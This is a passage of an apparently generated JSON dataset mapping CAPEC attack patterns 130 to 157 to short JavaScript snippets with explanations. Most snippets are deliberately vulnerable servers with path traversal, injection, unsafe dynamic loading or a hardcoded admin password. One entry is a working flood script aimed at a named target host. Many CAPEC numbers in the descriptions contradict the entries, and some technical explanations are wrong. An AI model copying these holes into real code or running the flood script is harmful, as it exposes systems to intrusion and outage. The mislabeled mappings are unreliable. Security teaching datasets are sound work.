        "description": "This JavaScript code snippet demonstrates an excessive allocation attack by allocating a large amount of memory in a loop. The function `allocateExcessiveMemory` takes a `size` parameter, which determines the number of large arrays (each with 1 million elements) to be allocated. This can lead to excessive memory consumption, potentially exhausting the available memory resources. The code embodies the main idea of CAPEC-130 by causing the target to allocate excessive resources (memory) through a single or a small number of requests. The related CWEs are represented as follows: CWE-770 (Allocation of Resources Without Limits or Throttling) is shown by the lack of any checks or limits on the size parameter, CWE-1325 (Improperly Controlled Sequential Memory Allocation) is demonstrated by the continuous allocation of large arrays without proper control, and CWE-400 (Uncontrolled Resource Consumption) is evident as the function allows an actor to influence the amount of memory consumed, potentially leading to resource exhaustion."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "function handleRequest(req, res) {\n  let resource = allocateResource();\n  // Process the request\n  if (req.query.releaseEarly) {\n    releaseResource(resource); // CWE-826: Premature Release of Resource During Expected Lifetime\n  }\n  // Simulate some processing\n  setTimeout(() => {\n    if (!req.query.releaseEarly) {\n      // CWE-772: Missing Release of Resource after Effective Lifetime\n      // CWE-404: Improper Resource Shutdown or Release\n      releaseResource(resource);\n    }\n    res.send('Request processed');\n  }, 1000);\n}\n\nfunction allocateResource() {\n  // Simulate resource allocation\n  return {};\n}\n\nfunction releaseResource(resource) {\n  // Simulate resource release\n  resource = null;\n}",
        "description": "This JavaScript code snippet demonstrates a resource leak vulnerability. The `handleRequest` function allocates a resource and processes a request. If the `releaseEarly` query parameter is set, the resource is prematurely released (CWE-826). If not, the resource is released after a delay, but if an error occurs or the function exits unexpectedly, the resource may not be released at all (CWE-772, CWE-404). This can lead to resource depletion, making the system vulnerable to resource leak exposure as described in the CAPEC."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(filePath) {\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\nconst userInputPath = '/tmp/user_input';\nreadFile(userInputPath);",
        "description": "This JavaScript code snippet demonstrates a potential symlink attack vulnerability. The `readFile` function takes a file path and reads its content. The `userInputPath` variable is set to a path that could be controlled by an attacker. If an attacker creates a symbolic link at `/tmp/user_input` pointing to a sensitive file, the `readFile` function will follow the symlink and read the content of the unintended file. This embodies the main idea of the CAPEC by showing how improper link resolution and external control of file paths can lead to unauthorized file access."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "const args = process.argv.slice(2);\nconst knownSwitches = ['--help', '--version', '--verbose'];\nconst hiddenSwitches = ['--debug', '--admin', '--config'];\n\nargs.forEach(arg => {\n  if (knownSwitches.includes(arg)) {\n    console.log(`Executing known switch: ${arg}`);\n  } else if (hiddenSwitches.includes(arg)) {\n    console.log(`Executing hidden switch: ${arg}`);\n    // Potentially sensitive information or functionality\n    if (arg === '--debug') {\n      console.log('Debugging information: ...');\n    } else if (arg === '--admin') {\n      console.log('Admin mode activated');\n    } else if (arg === '--config') {\n      console.log('Configuration details: ...');\n    }\n  } else {\n    console.log(`Unknown switch: ${arg}`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the 'Try All Common Switches' attack pattern by iterating over command-line arguments and attempting to invoke both known and hidden switches. The 'knownSwitches' array contains documented options, while the 'hiddenSwitches' array includes undocumented or sensitive options that could reveal debugging information, admin functionalities, or configuration details. This code embodies the CAPEC idea by indiscriminately trying all switches to discover potential weaknesses. The related CWEs are represented by the presence of hidden functionality (CWE-912), incomplete input validation (CWE-184), and the potential for revealing sensitive information through unchecked conditions (CWE-391)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "const http = require('http');\nconst querystring = require('querystring');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const postData = querystring.parse(body);\n      const email = postData.email;\n      const subject = postData.subject;\n      const message = postData.message;\n\n      // Vulnerable to Email Injection\n      const emailHeaders = `From: attacker@example.com\\r\\nTo: ${email}\\r\\nSubject: ${subject}\\r\\n\\r\\n${message}`;\n\n      // Simulate sending email (vulnerable to injection)\n      console.log(emailHeaders);\n\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Email sent');\n    });\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end('<form method=\"POST\"><input name=\"email\"/><input name=\"subject\"/><textarea name=\"message\"></textarea><button type=\"submit\">Send</button></form>');\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests. When a POST request is received, it parses the body to extract email, subject, and message fields. It then constructs email headers using these fields without proper neutralization or escaping, making it vulnerable to email injection attacks. An attacker could manipulate the email, subject, or message fields to inject additional headers or content, potentially leading to unauthorized actions or information disclosure. This example embodies the main idea of CAPEC-138 (Email Injection) and demonstrates related weaknesses such as improper neutralization of special elements (CWE-150, CWE-147) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/format', (req, res) => {\n  const userInput = req.body.userInput;\n  const formattedString = `User input: ${userInput}`;\n  console.log(formattedString);\n  res.send(formattedString);\n});\n\napp.listen(port, () => {\n  console.log(`Server running on port ${port}`);\n});",
        "description": "This JavaScript code snippet sets up a basic Express server that listens for POST requests on the '/format' endpoint. The server expects a 'userInput' field in the request body. The user input is then directly embedded into a formatted string using template literals and logged to the console. This code is vulnerable to format string injection because it does not validate or sanitize the user input, allowing an attacker to potentially inject malicious formatting characters. This embodies the main idea of CAPEC-121 (Format String Injection) and highlights related CWEs such as CWE-134 (Use of Externally-Controlled Format String) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "const ldap = require('ldapjs');\nconst client = ldap.createClient({ url: 'ldap://localhost:389' });\n\nfunction authenticate(username, password) {\n  const base = 'dc=example,dc=com';\n  const filter = `(uid=${username})`;\n  const opts = { filter: filter, scope: 'sub' };\n\n  client.search(base, opts, (err, res) => {\n    if (err) {\n      console.error('LDAP search error:', err);\n      return;\n    }\n\n    res.on('searchEntry', (entry) => {\n      console.log('User found:', entry.object);\n      // Perform password check here\n    });\n\n    res.on('error', (err) => {\n      console.error('LDAP search error:', err);\n    });\n  });\n}\n\nauthenticate('*', 'password');",
        "description": "This JavaScript code snippet demonstrates a vulnerable LDAP query that is susceptible to LDAP Injection. The `authenticate` function takes a `username` and `password` as input and constructs an LDAP query filter using the `username` directly. If an attacker inputs a special character like `*` for the `username`, it can manipulate the LDAP query to return all users in the directory, thus exposing sensitive information. This code embodies the main idea of CAPEC-138 (LDAP Injection) and highlights CWE-90 (Improper Neutralization of Special Elements used in an LDAP Query) by not properly sanitizing the user input before constructing the LDAP query."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const query = require('url').parse(req.url, true).query;\n  const userInput = query.userInput;\n\n  // Vulnerable code: directly using user input in a GET request\n  const options = {\n    hostname: 'example.com',\n    path: `/search?query=${userInput}`,\n    method: 'GET'\n  };\n\n  const request = http.request(options, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  });\n\n  request.on('error', (e) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Problem with request: ${e.message}`);\n  });\n\n  request.end();\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts a user-provided input from the query parameters of the request URL and uses this input directly in constructing a new HTTP GET request to an external server (example.com). This code is vulnerable to parameter injection attacks because it does not properly sanitize or encode the user input. An attacker could manipulate the 'userInput' parameter to inject additional parameters or modify the request, potentially leading to unintended behavior or security vulnerabilities. This example embodies the main idea of CAPEC-137 (Parameter Injection) and is related to several CWEs, including CWE-88 (Improper Neutralization of Argument Delimiters in a Command) and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const query = new URL(req.url, `http://${req.headers.host}`).searchParams;\n  const className = query.get('class');\n  const methodName = query.get('method');\n\n  try {\n    const ClassRef = require(`./${className}`);\n    const instance = new ClassRef();\n    const result = instance[methodName]();\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Result: ${result}`);\n  } catch (error) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error occurred');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts 'class' and 'method' parameters from the query string of the request URL. The code then attempts to dynamically load a class and invoke a method on an instance of that class using the provided parameters. This embodies the concept of 'Reflection Injection' (CAPEC-470) where an adversary can control the input to select classes or methods. If an attacker supplies malicious input, they could potentially load and execute unintended or harmful code, leading to vulnerabilities such as code injection (CWE-94) or command injection (CWE-77). The code demonstrates how improper handling of externally-controlled input can lead to severe security issues."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'public');\n  let filePath = path.join(basePath, req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. The code constructs the file path using the 'path.join' method, which concatenates the base directory with the requested URL. However, it does not properly validate or sanitize the input URL, making it vulnerable to a Relative Path Traversal attack. An attacker could exploit this by sending a request with a URL containing sequences like '../' to access files outside the 'public' directory, potentially exposing sensitive information or system files. This snippet embodies the main idea of the CAPEC by demonstrating how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "const forms = ['form1', 'form2', 'form3'];\nlet currentFormIndex = 0;\n\nfunction navigateToForm(formName) {\n  const formIndex = forms.indexOf(formName);\n  if (formIndex === -1 || formIndex > currentFormIndex) {\n    alert('Unauthorized form access!');\n    return;\n  }\n  currentFormIndex = formIndex;\n  document.getElementById('form-container').innerHTML = document.getElementById(formName).innerHTML;\n}\n\n// Simulate form navigation\nnavigateToForm('form3'); // Bypasses form1 and form2\n",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can bypass intermediate forms in a multi-form web application. The `forms` array represents the sequence of forms that should be filled out in order. The `navigateToForm` function allows navigation to a specific form by its name. However, the function does not properly enforce the sequence, allowing an attacker to directly navigate to a later form (e.g., 'form3') without completing the earlier forms ('form1' and 'form2'). This embodies the CAPEC concept of bypassing intermediate forms and highlights related CWEs such as incomplete internal state distinction (CWE-372) and reliance on untrusted inputs in a security decision (CWE-807)."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "const cache = {}; // Simulated cache\n\nfunction fetchData(url) {\n  if (cache[url]) {\n    return cache[url]; // Return cached data\n  }\n  // Simulate fetching data from a less trusted source\n  const data = fetchFromUntrustedSource(url);\n  cache[url] = data; // Store in cache without verification\n  return data;\n}\n\nfunction fetchFromUntrustedSource(url) {\n  // Simulate fetching data from an untrusted source\n  return 'untrusted data';\n}\n\n// Example usage\nconst data = fetchData('http://example.com');\nconsole.log(data);",
        "description": "This JavaScript code snippet demonstrates a basic cache poisoning vulnerability. The `fetchData` function first checks if the requested URL's data is already in the cache. If it is, it returns the cached data. If not, it fetches the data from an untrusted source using the `fetchFromUntrustedSource` function and stores it in the cache without any verification. This embodies the CAPEC concept of cache poisoning, where an attacker can exploit the cache to store incorrect or harmful data. The related CWEs are represented by the lack of verification of data authenticity (CWE-345), use of a less trusted source (CWE-348), and acceptance of untrusted data (CWE-349)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "const dns = require('dns');\n\nfunction resolveDomain(domain) {\n  dns.resolve4(domain, (err, addresses) => {\n    if (err) throw err;\n    console.log(`IP addresses for ${domain}: ${addresses}`);\n    // Simulate using the resolved IP address for a security-critical action\n    performSecurityCriticalAction(addresses[0]);\n  });\n}\n\nfunction performSecurityCriticalAction(ip) {\n  dns.reverse(ip, (err, hostnames) => {\n    if (err) throw err;\n    if (hostnames.length === 0) {\n      console.error('No hostnames found for IP:', ip);\n      return;\n    }\n    console.log(`Hostnames for IP ${ip}: ${hostnames}`);\n    // Assume the first hostname is trusted without proper validation\n    if (hostnames[0] === 'trusted.example.com') {\n      console.log('Performing security-critical action for trusted host.');\n    } else {\n      console.error('Hostname validation failed.');\n    }\n  });\n}\n\nresolveDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS resolution process that is vulnerable to DNS cache poisoning. The `resolveDomain` function resolves a domain name to its IP address and then uses this IP address in a security-critical action. The `performSecurityCriticalAction` function performs a reverse DNS lookup on the IP address to obtain the hostname and makes a security decision based on this hostname. The code does not properly validate the authenticity of the DNS responses, making it susceptible to DNS cache poisoning attacks. This embodies the main idea of CAPEC-139 (DNS Cache Poisoning) and highlights related CWEs such as CWE-348 (Use of Less Trusted Source), CWE-345 (Insufficient Verification of Data Authenticity), and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action)."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const filePath = `./public${req.url}`;\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('404 Not Found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://localhost:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the './public' directory based on the URL requested by the client. If the file exists, it serves the file; otherwise, it returns a 404 error. This code embodies the main idea of CAPEC-170 (Detect Unpublicized Web Pages) by potentially exposing unpublicized or sensitive files stored under the web root directory without proper access control. This can lead to unauthorized access to sensitive information (CWE-219) and direct requests to restricted URLs (CWE-425)."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/admin') {\n    fs.readFile('./admin.html', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/html'});\n        res.end('404 Not Found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      }\n    });\n  } else if (req.url === '/wsdl') {\n    fs.readFile('./service.wsdl', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/xml'});\n        res.end('404 Not Found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/xml'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/html'});\n    res.end('403 Forbidden');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It serves an 'admin.html' file when the '/admin' URL is requested and a 'service.wsdl' file when the '/wsdl' URL is requested. If any other URL is requested, it responds with a '403 Forbidden' status. This code embodies the main idea of the CAPEC by exposing potentially sensitive and unpublicized web services (e.g., '/admin' and '/wsdl') without adequate security controls. The related CWEs are represented as follows: CWE-425 (Direct Request) is shown by directly serving files based on URL paths without proper authorization checks, CWE-651 (Exposure of WSDL File) is demonstrated by serving the 'service.wsdl' file, and CWE-223 (Omission of Security-relevant Information) is implied by the lack of logging or security measures to track access to these files."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "const crypto = require('crypto');\n\nfunction calculateChecksum(message) {\n  return crypto.createHash('md5').update(message).digest('hex');\n}\n\nfunction sendMessage(message) {\n  const checksum = calculateChecksum(message);\n  // Simulate sending message and checksum\n  return { message, checksum };\n}\n\nfunction receiveMessage(packet) {\n  const { message, checksum } = packet;\n  const calculatedChecksum = calculateChecksum(message);\n  if (calculatedChecksum !== checksum) {\n    console.log('Message integrity check failed!');\n  } else {\n    console.log('Message received successfully.');\n  }\n}\n\n// Simulate an attacker modifying the message and checksum\nlet packet = sendMessage('Hello, World!');\npacket.message = 'Hello, Hacker!';\npacket.checksum = calculateChecksum('Hello, Hacker!');\n\nreceiveMessage(packet);",
        "description": "This JavaScript code snippet demonstrates a basic implementation of message integrity verification using checksums. The `calculateChecksum` function generates an MD5 hash of the message, which is used as the checksum. The `sendMessage` function simulates sending a message along with its checksum. The `receiveMessage` function verifies the integrity of the received message by recalculating the checksum and comparing it with the received checksum. The code also simulates an attack where the message and checksum are modified by an adversary, demonstrating how the integrity check can be spoofed if the checksum is not securely validated. This example embodies the concept of Checksum Spoofing (CAPEC-72) and highlights related weaknesses such as the use of a weak hash function (CWE-328) and improper validation of integrity check values (CWE-354)."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-schema', (req, res) => {\n  const schemaPath = req.body.schemaPath;\n  fs.readFile(schemaPath, 'utf8', (err, data) => {\n    if (err) {\n      return res.status(500).send('Error reading schema');\n    }\n    const parser = new xml2js.Parser();\n    parser.parseString(data, (err, result) => {\n      if (err) {\n        return res.status(500).send('Error parsing schema');\n      }\n      // Assume the schema is valid and use it to validate incoming XML\n      res.send('Schema uploaded and parsed successfully');\n    });\n  });\n});\n\napp.post('/submit-xml', (req, res) => {\n  const xmlData = req.body.xmlData;\n  const schemaPath = req.body.schemaPath;\n  fs.readFile(schemaPath, 'utf8', (err, schemaData) => {\n    if (err) {\n      return res.status(500).send('Error reading schema');\n    }\n    const parser = new xml2js.Parser({ schema: schemaData });\n    parser.parseString(xmlData, (err, result) => {\n      if (err) {\n        return res.status(400).send('Invalid XML');\n      }\n      res.send('XML is valid');\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that handles XML schema uploads and XML data submissions. The '/upload-schema' endpoint allows users to upload an XML schema by specifying its path. The server reads and parses the schema without validating its integrity or source, which is a vulnerability (CWE-112: Missing XML Validation). The '/submit-xml' endpoint accepts XML data and a schema path, reads the schema, and uses it to validate the XML data. This setup allows an attacker to upload a malicious schema (CAPEC: XML Schema Poisoning) and potentially manipulate the validation process. The code also demonstrates CWE-15 (External Control of System or Configuration Setting) and CWE-472 (External Control of Assumed-Immutable Web Parameter) by allowing external control over the schema path and XML data."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "const http = require('http');\nconst xmlPayload = '<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://www.example.com/webservice\"><soapenv:Header/><soapenv:Body><web:ping/></soapenv:Body></soapenv:Envelope>';\n\nfunction sendRequest() {\n  const options = {\n    hostname: 'target-server.com',\n    port: 80,\n    path: '/webservice',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'text/xml',\n      'Content-Length': Buffer.byteLength(xmlPayload)\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  });\n\n  req.on('error', (e) => {});\n  req.write(xmlPayload);\n  req.end();\n}\n\nsetInterval(sendRequest, 10);",
        "description": "This JavaScript code snippet demonstrates a basic implementation of an 'XML Ping of the Death' attack. The code repeatedly sends a small SOAP XML message to a target server at a rapid rate, aiming to deplete the server's resources and potentially cause a denial of service. The `sendRequest` function constructs an HTTP POST request with a SOAP XML payload and sends it to the target server. The `setInterval` function ensures that the request is sent every 10 milliseconds, creating a flood of requests. This attack leverages CWE-400 (Uncontrolled Resource Consumption) by overwhelming the server with resource-intensive XML processing, CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of requests, and CWE-112 (Missing XML Validation) if the server does not properly validate the incoming XML."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  let content = '<h1>Welcome to the site</h1>';\n\n  if (queryObject.message) {\n    content = `<h1>${queryObject.message}</h1>`;\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(content);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads a 'message' parameter from the URL query string and displays it as the content of an HTML page. This code is vulnerable to content spoofing (CAPEC-139) because it directly uses user input to generate the page content without any validation or sanitization. This can lead to various attacks, such as displaying misleading information or injecting malicious content. The code also demonstrates CWE-345 (Insufficient Verification of Data Authenticity) by not verifying the authenticity of the 'message' parameter, CWE-924 (Improper Enforcement of Message Integrity During Transmission) by not ensuring the integrity of the message, and CWE-433 (Unparsed Raw Web Content Delivery) by delivering raw content based on user input."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\nfunction createTempFile() {\n  const tempDir = os.tmpdir();\n  const tempFileName = `${tempDir}/tempfile_${Math.random().toString(36).substring(2, 15)}.txt`;\n  fs.writeFileSync(tempFileName, 'Temporary data');\n  console.log(`Temporary file created at: ${tempFileName}`);\n}\n\ncreateTempFile();",
        "description": "This JavaScript code snippet demonstrates the creation of a temporary file with a predictable name in the system's temporary directory. The `os.tmpdir()` function is used to get the temporary directory, and a predictable file name is generated using a random string. The `fs.writeFileSync` function creates the file with default permissions, which may be insecure. This code embodies the main idea of CAPEC-139: 'Explore for Predictable Temporary File Names', as it shows how an attacker could predict the location and name of temporary files. The related CWEs are represented by the use of insecure temporary file creation (CWE-377), potential insecure permissions (CWE-378), and the creation of a temporary file in a directory with potentially insecure permissions (CWE-379)."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Default configuration file path\nconst configFilePath = path.join('/etc', 'config.json');\n\n// Function to read configuration file\nfunction readConfig() {\n  try {\n    const data = fs.readFileSync(configFilePath, 'utf8');\n    console.log('Configuration Data:', data);\n  } catch (err) {\n    console.error('Error reading configuration file:', err);\n  }\n}\n\n// Function to write sensitive data to a file\nfunction writeSensitiveData(data) {\n  const sensitiveFilePath = path.join('/tmp', 'sensitive_data.txt');\n  fs.writeFileSync(sensitiveFilePath, data);\n  console.log('Sensitive data written to:', sensitiveFilePath);\n}\n\n// Simulate reading config and writing sensitive data\nreadConfig();\nwriteSensitiveData('This is some sensitive information.');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' (CAPEC-168). The code reads a configuration file from a well-known location (/etc/config.json) and writes sensitive data to a temporary file (/tmp/sensitive_data.txt). This illustrates how an adversary could exploit predictable file locations to access or manipulate sensitive information. The code also touches on related CWEs, such as CWE-552 (Files or Directories Accessible to External Parties) by making sensitive data accessible in a common temporary directory, and CWE-1330 (Remanent Data Readable after Memory Erase) by not properly handling the sensitive data after use."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "const users = { 'admin': 'password123' }; \n\nfunction authenticate(username, password) { \n  if (users[username] && users[username] === password) { \n    return true; \n  } \n  return false; \n} \n\nfunction login(req) { \n  const { username, password } = req.body; \n  if (authenticate(username, password)) { \n    console.log('Login successful'); \n    return 'Welcome ' + username; \n  } else { \n    console.log('Login failed'); \n    return 'Invalid credentials'; \n  } \n} \n\n// Example request object \nconst req = { body: { username: 'admin', password: 'password123' } }; \nconsole.log(login(req));",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to identity spoofing. The `authenticate` function checks if the provided username and password match the stored credentials. The `login` function processes a login request and uses the `authenticate` function to validate the credentials. This code is vulnerable to several weaknesses: \n1. **Improper Authentication (CWE-287)**: The authentication mechanism does not sufficiently prove the identity of the user beyond matching the username and password. \n2. **Authentication Bypass by Spoofing (CWE-290)**: An attacker could potentially spoof the credentials if they are able to guess or steal the password. \n3. **Weak Authentication (CWE-1390)**: The use of a simple password without additional factors makes it easy for attackers to compromise the system. \n4. **Key Exchange without Entity Authentication (CWE-322)**: There is no mechanism to verify the identity of the user during any key exchange process. \n5. **Authentication Bypass by Assumed-Immutable Data (CWE-302)**: The code assumes that the username and password are immutable and cannot be tampered with, which is not the case in real-world scenarios. This snippet highlights the importance of implementing robust authentication mechanisms to prevent identity spoofing attacks."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "function processUserInput(input) {\n    // Improper Input Validation (CWE-20)\n    if (input.includes('<script>')) {\n        console.log('Invalid input');\n        return;\n    }\n    // Reliance on Untrusted Inputs in a Security Decision (CWE-807)\n    if (input === 'admin') {\n        console.log('Welcome, admin!');\n    } else {\n        console.log('Hello, user!');\n    }\n}\n\n// Example of vulnerable input\nprocessUserInput('<script>alert(\"XSS\")</script>');\nprocessUserInput('admin');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to improper input validation and reliance on untrusted inputs in security decisions. The function `processUserInput` checks if the input contains the string '<script>' and logs 'Invalid input' if it does. However, this simplistic check is insufficient to prevent various forms of malicious input, such as different script tags or encoded characters. Additionally, the function makes a security decision based on the input value, granting 'admin' access if the input is 'admin'. This reliance on untrusted input can be exploited by an attacker to gain unauthorized access. The code embodies the main idea of CAPEC-137: Input Data Manipulation, by showing how an attacker can manipulate input to bypass security mechanisms."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "const fetchResource = (url) => {\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const destination = url || 'https://trusted-resource.com/data';\n  \n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!destination.startsWith('https://trusted-resource.com')) {\n    console.error('Untrusted source detected!');\n    return;\n  }\n  \n  fetch(destination)\n    .then(response => {\n      if (!response.ok) {\n        throw new Error('Network response was not ok');\n      }\n      return response.json();\n    })\n    .then(data => {\n      console.log('Data fetched:', data);\n    })\n    .catch(error => {\n      console.error('Fetch error:', error);\n    });\n};\n\n// CWE-451: User Interface (UI) Misrepresentation of Critical Information\nconst userInput = prompt('Enter the resource URL:');\nfetchResource(userInput);",
        "description": "This JavaScript code snippet demonstrates a scenario where an application fetches a resource from a user-specified URL. The function `fetchResource` takes a URL as input and defaults to a trusted resource if no URL is provided. It checks if the URL starts with 'https://trusted-resource.com' to prevent fetching from untrusted sources (CWE-940). If the URL is untrusted, it logs an error and aborts the fetch operation. The code also includes a prompt for user input, which can be manipulated by an attacker to provide a malicious URL (CWE-451). This snippet embodies the main idea of CAPEC-160 (Resource Location Spoofing) by showing how an adversary could deceive the application into fetching a resource from an unintended location."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Directory for temporary files\nconst tempDir = path.join(__dirname, 'temp');\n\n// Ensure the temp directory exists\nif (!fs.existsSync(tempDir)) {\n  fs.mkdirSync(tempDir);\n}\n\n// Create a temporary file with insecure permissions\nconst tempFilePath = path.join(tempDir, 'tempfile.txt');\nfs.writeFileSync(tempFilePath, 'Sensitive Information', { mode: 0o666 });\n\n// Simulate caching sensitive information\nconst cacheDir = path.join(__dirname, 'cache');\nif (!fs.existsSync(cacheDir)) {\n  fs.mkdirSync(cacheDir);\n}\nconst cacheFilePath = path.join(cacheDir, 'cachefile.txt');\nfs.writeFileSync(cacheFilePath, 'Sensitive Cache Data');\n\nconsole.log('Temporary and cache files created.');",
        "description": "This JavaScript code snippet demonstrates the creation of temporary and cache files with insecure permissions, embodying the main idea of the CAPEC 'Screen Temporary Files for Sensitive Information'. The code creates a temporary file and a cache file, both of which store sensitive information. The temporary file is created with insecure permissions (0o666), making it accessible to unintended actors. The cache file is stored in a directory without proper access controls, potentially exposing sensitive data. This snippet highlights the vulnerabilities described in CWEs 377, 524, 379, 378, and 219, showing how sensitive information can be exposed through improper handling of temporary and cache files."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Cleartext transmission of sensitive information (CWE-319)\n    });\n    req.on('end', () => {\n      console.log('Received credentials:', body); // Potential sniffing attack vulnerability\n      res.end('Login successful');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
